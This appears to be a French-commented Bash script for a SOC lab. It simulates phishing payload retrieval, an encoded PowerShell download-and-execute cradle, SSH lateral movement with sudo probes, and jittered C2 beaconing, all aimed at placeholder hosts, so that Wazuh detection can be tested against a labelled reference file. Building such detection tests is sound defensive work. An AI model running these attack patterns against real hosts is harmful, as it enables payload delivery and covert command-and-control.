#!/bin/bash
# Scenarios avances (S8 extension) : phishing/URL suspecte, PowerShell suspect,
# mouvement lateral simule, C2 beaconing simule. Detection reelle via auditd
# (execve monitoring) + regles Wazuh personnalisees (local_rules.xml, IDs 100099-100105),
# le ruleset OOTB de Wazuh ne couvrant pas nativement l'inspection de commandes.
set -u
REF_FILE=~/reference_advanced.jsonl
> "$REF_FILE"

log_scenario() {
  local name="$1" start="$2" end="$3" incident_type="$4" criticite="$5" tactic="$6" technique="$7"
  echo "{\"scenario\":\"$name\",\"start\":\"$start\",\"end\":\"$end\",\"incident_type_ref\":\"$incident_type\",\"criticite_ref\":\"$criticite\",\"mitre_tactic_ref\":\"$tactic\",\"mitre_technique_ref\":\"$technique\"}" >> "$REF_FILE"
}

now_iso() { date -u +"%Y-%m-%dT%H:%M:%S"; }

echo "[1/4] Phishing / URL suspecte (recuperation de payload via curl)"
START=$(now_iso)
curl -s -m3 "http://phishing-simulated-payload.example.invalid/malicious.sh" >/dev/null 2>&1
END=$(now_iso)
log_scenario "phishing_url_proxy" "$START" "$END" "Recuperation de payload suspect (proxy phishing)" "haute" "Command and Control" "T1105"
sleep 3

echo "[2/4] Activite PowerShell suspecte (commande encodee)"
START=$(now_iso)
pwsh -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBzAC4AcABzADEAJwApAA==" 2>/dev/null || true
END=$(now_iso)
log_scenario "powershell_suspicious" "$START" "$END" "Execution PowerShell encodee suspecte" "critique" "Execution" "T1059.001"
sleep 3

echo "[3/4] Mouvement lateral simule (connexions SSH successives + elevation)"
START=$(now_iso)
for i in 1 2; do
  ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 soc@localhost "sudo -n true 2>/dev/null; sudo whoami >/dev/null 2>&1" 2>/dev/null
  sleep 2
done
END=$(now_iso)
log_scenario "lateral_movement_simulated" "$START" "$END" "Connexions SSH successives avec elevation (mouvement lateral simule)" "haute" "Lateral Movement" "T1021.004"
sleep 3

echo "[4/4] C2 beaconing simule (requetes repetees avec jitter, destination variable)"
START=$(now_iso)
PATHS=("checkin" "beacon" "poll" "sync" "hb")
for i in 1 2 3 4 5; do
  p="${PATHS[$((RANDOM % ${#PATHS[@]}))]}"
  curl -s -m3 "http://c2-beacon-simulated.example.invalid/${p}?id=$i&t=$(date +%s)" >/dev/null 2>&1
  # jitter : intervalle aleatoire entre 5 et 12s, pas un pas fixe de 8s
  sleep $((5 + RANDOM % 8))
done
END=$(now_iso)
log_scenario "c2_beaconing_simulated" "$START" "$END" "Requetes repetees vers la meme destination (C2 beaconing simule)" "haute" "Command and Control" "T1071"

echo "Termine. Reference ecrite dans $REF_FILE"
cat "$REF_FILE"
